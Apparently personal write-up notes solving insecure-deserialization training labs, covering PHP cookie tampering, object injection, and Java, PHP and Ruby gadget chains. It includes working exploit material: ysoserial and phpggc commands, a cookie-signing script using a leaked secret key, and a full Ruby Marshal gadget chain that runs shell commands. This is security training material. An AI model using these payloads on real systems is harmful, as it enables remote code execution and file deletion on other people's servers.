### Modifying serialized objects

In the first exercise, we see a cookie with our session info, and a value b:0.
This is setting the admin = to false. But we can change the value to 1, with burp, and this opens up the possibility to check the admin portal.

From there, the application reads as we are admins, and gave us privilege to delete users accounts

`/admin/delete?username=carlos`

---
### Modifying serialized data types

The solution for this exercise is quite similar to the previous one.
But in this case, we have the decoded PHP value with different types of data, as follows:
```php
O:4:"User":2:
{
s:8:"username";
s:13:"administrator";
s:12:"access_token";
i:0;
}
```

In fact, this is the serialized content of the PHP.
You can serialize objects with the function 'serialize()', and convert data types to string representation. This data can be stored, transmitted or deserialized back with 'unserialize()'. After the unserialization, you can access the properties and methods of the "User" object as normal with any other object in PHP.

In the example above, we can break it down like this:
`"O" - Indicates that the following data is an object`
`"4" - The lenght of the class name (User)`
`"User" Is the class name`
`"2" - This is the number of properties in the object`

This 2 properties are "Username" and "Access Token"
```php
{
s:8:"username";s:13:"administrator";
s:12:"access_token";i:0;
}
```

---
### Using application functionality to exploit insecure deserialization

This exercise will abuse the serialization bug, to impersonate a user trough the "avatar_link" parameter. By tricking the server to think we are another user.

We have this encoded in the cookie:

```php
O:4:"User":3:
{
s:8:"username";
s:6:"wiener";
s:12:"access_token";
s:32:"t7lxrrzxx394nr2ssmzlvjvej0qv0wvg";
s:11:"avatar_link";
s:19:"users/wiener/avatar";
}
```

So, when we go to "Delete Account", the server will delete the user "wiener", with the provided access token for this account, and instead of deleting our avatar at "users/wiener/avatar", it will be deleting "home/carlos/morale.txt", which is the target file.

---
### Arbitrary object injection in PHP 

Here you can see the cookie is set to a serialized object with your user info, like this: 

```php
O:4:"User":2:
{
s:8:"username";
s:6:"wiener";
s:12:"access_token";
s:32:"fgkfmi087jtd7h97nb0is740oge6uu53";
}
```

In the target, you can see its calling this file at `/libs/customTemplate.php` with a destruct function. So, you can see you nede to modify the session cookie valie, so the object can be sanitized and then delete the desired file. 

Replace your session cookie with: `O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}`

That's it.

---
### Exploiting Java deserialization with Apache Commons

Download ysoserial, and use this command:
```text
java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
     --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
     --add-opens=java.base/java.net=ALL-UNNAMED \
     --add-opens=java.base/java.util=ALL-UNNAMED \
     -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 > cookie
```

This is somehow printing also some new lines, so you need to paste it on the cookie section, get it all green, and then URL encode all characters. 

I think can get it right using this after `paste -s -d '' <YOUR-FILE> > output_file`

---
### Exploiting PHP deserialization with a pre-built gadget chain

Go to /cgi-bin/phpinfo.php, and get the SECRET_KEY=0vun5heha3z7cny9a3u0oxovc5qv7vi7

You can see your cookie is a PHP object.

Using PHPGCC, use this command to generate a payload to delete morale.txt file
`./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64`

And use the output to that in this script:
```php
<?php $object = "OBJECT-GENERATED-BY-PHPGGC"; $secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP"; $cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}'); echo $cookie;
```

Replace the values, and use that cookie on your burp repeater request. You solved the lab.

---
### Exploiting Ruby deserialization using a documented gadget chain

This is the correct script:
```ruby
require 'base64'
require 'net/http'
require 'rubygems/package'

# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")

n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])

# Encode the payload in base64
encoded_payload = Base64.encode64(payload)
puts encoded_payload

```

This output you rm the new lines with `echo "OUTPUT" | tr -d "\n\r"`

In decoder, encode in URL. Replace your cookie with this. Solved